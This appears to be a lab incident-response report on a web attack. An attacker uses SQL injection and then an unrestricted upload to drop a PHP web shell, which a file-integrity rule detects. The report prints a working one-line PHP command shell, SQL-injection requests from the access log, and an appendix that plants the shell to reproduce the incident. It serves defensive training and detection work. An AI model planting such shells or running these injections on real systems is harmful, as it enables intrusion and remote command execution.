# INV-2026-07-02 — Web Application Attack Leading to Web Shell Upload

| Field | Value |
|-------|-------|
| **Incident ID** | INV-2026-07-02 |
| **Date / time (UTC)** | 2026-07-16 14:02 |
| **Analyst** | Anthony Mackenzi |
| **Severity** | Critical |
| **Status** | Closed |
| **Affected asset** | `ubuntu-victim` (agent 002), 192.168.1.60 — Apache web root |
| **Source** | 192.168.1.70 |
| **MITRE ATT&CK** | [T1190](https://attack.mitre.org/techniques/T1190/), [T1505.003](https://attack.mitre.org/techniques/T1505/003/) |
| **Playbook used** | [PB-04](../../playbooks/PB-04-web-attack.md) |

## Executive summary
An attacker (192.168.1.70) scanned the lab web application, attempted SQL
injection, and then abused an unrestricted file-upload feature to write a PHP
**web shell** into the Apache web root. The real-time File Integrity Monitoring
rule (100060) caught the new `.php` file in `/var/www` within seconds and raised
a Critical alert. The web service was taken offline, the shell quarantined, and
the upload vulnerability fixed before the attacker executed meaningful commands.

## Timeline
| Time (UTC) | Event |
|------------|-------|
| 14:02:10 | Directory scan from 192.168.1.70 (`gobuster` UA), many 404s |
| 14:03:41 | SQL-injection attempts (`sqlmap` UA) — **Suricata 1000006 / 1000005**, **Wazuh 100050** |
| 14:05:02 | `POST /upload.php` — file upload accepted |
| 14:05:03 | `shell.php` written to `/var/www/html/uploads/` → **Wazuh 100060 (Critical)** |
| 14:05:55 | `GET /uploads/shell.php?cmd=id` returns 200 |
| 14:07 | Analyst triage begins (paged on 100060) |
| 14:12 | Apache stopped, shell quarantined, source blocked |
| 14:40 | Upload handler fixed, web root restored from git; incident closed |

## Detection
The pivotal alert was **`rule.id:100060`** — *New or modified file in the web root
(possible web shell)* — from real-time FIM on `/var/www`. Exploitation attempts
(100050, Suricata) are common background noise; **a new executable file
appearing in the web root is almost never legitimate**, which is why this rule is
the one that drives the response.

![FIM web shell alert](screenshots/01-fim-webshell-alert.png)

## Investigation & evidence
**1. The dropped file.** The FIM event captured the path and hash:
```
syscheck.path: /var/www/html/uploads/shell.php
syscheck.event: added
syscheck.sha256_after: 9f2c1e7a...c4b8   (record the full hash as an IOC)
```
Contents retrieved from the host (quarantined copy):
```php
<?php system($_GET['cmd']); ?>
```
A classic one-line command web shell (T1505.003).

**2. How it got there.** Reconstructed from the Apache access log:
```
192.168.1.70 - - [16/Jul/2026:14:03:41 +0000] "GET /product.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users HTTP/1.1" 500 620 "-" "sqlmap/1.7"
192.168.1.70 - - [16/Jul/2026:14:05:02 +0000] "POST /upload.php HTTP/1.1" 200 148 "-" "Mozilla/5.0"
192.168.1.70 - - [16/Jul/2026:14:05:55 +0000] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 54 "-" "curl/8.5.0"
```
The `200` on `shell.php?cmd=id` confirms the shell executed at least once.

![Access log reconstruction](screenshots/02-access-log.png)

**3. What the attacker ran.** Only `cmd=id` was observed (a single `200`). No
subsequent requests to the shell, and no `/tmp` staging, netcat execution
(100034), or outbound connection appeared for this host — the response cut it off
before hands-on-keyboard activity developed.

## Impact assessment
- **Integrity:** High — arbitrary file write to the web root achieved (web shell).
- **Confidentiality:** Medium — `id` ran as the web-server user (`www-data`); DB
  credentials in app config were reachable but no read was observed.
- **Availability:** the service was intentionally stopped by the responder, not
  the attacker.
- **Blast radius:** one host; code execution limited to `www-data`.

## Response actions
Executed [PB-04](../../playbooks/PB-04-web-attack.md):
```bash
sudo ufw deny from 192.168.1.70
sudo mv /var/www/html/uploads/shell.php /var/quarantine/    # preserve for analysis
sudo systemctl stop apache2
# Hunt for any other attacker files, not just the one that alerted:
sudo find /var/www -newermt '2026-07-16 14:00' -type f \( -name '*.php' -o -name '*.phtml' \)
ss -tnp | grep www-data     # no attacker-controlled connections
```
Only `shell.php` was found. Web root restored from version control.

## Root cause
The application's `upload.php` accepted arbitrary file types and stored them
inside the web root with execute permission — an **unrestricted file upload**
(CWE-434). Any authenticated (or, here, unauthenticated) user could drop
executable code.

## Lessons learned & detection tuning
1. **Fix the app:** allow-list upload types, store uploads outside the web root,
   strip execute permission, randomise stored filenames.
2. **Defence in depth:** put a reverse proxy / WAF in front and feed its logs to
   Wazuh.
3. **Detection held up well:** the FIM rule 100060 was the hero. Confirmed its
   real-time monitoring covers every web root on the host.
4. **Tuning:** allow-listed the app's legitimate deploy path so CI writes don't
   page, while still alerting on `uploads/`.

## Indicators of Compromise (IOCs)
| Type | Value |
|------|-------|
| Source IP | 192.168.1.70 |
| Dropped file | `/var/www/html/uploads/shell.php` |
| File SHA256 | 9f2c1e7a…c4b8 *(record full hash from your run)* |
| User-agents | `sqlmap/1.7`, `gobuster/3.6` |
| Web shell content | `<?php system($_GET['cmd']); ?>` |

## Appendix — reproduce this
```bash
bash simulations/web-attack/run.sh TARGET_URL=http://192.168.1.60
# then, on the victim, simulate the drop the vulnerable upload would cause:
echo '<?php system($_GET["cmd"]); ?>' | sudo tee /var/www/html/uploads/shell.php
# -> watch rule.id:100060 fire in real time
```
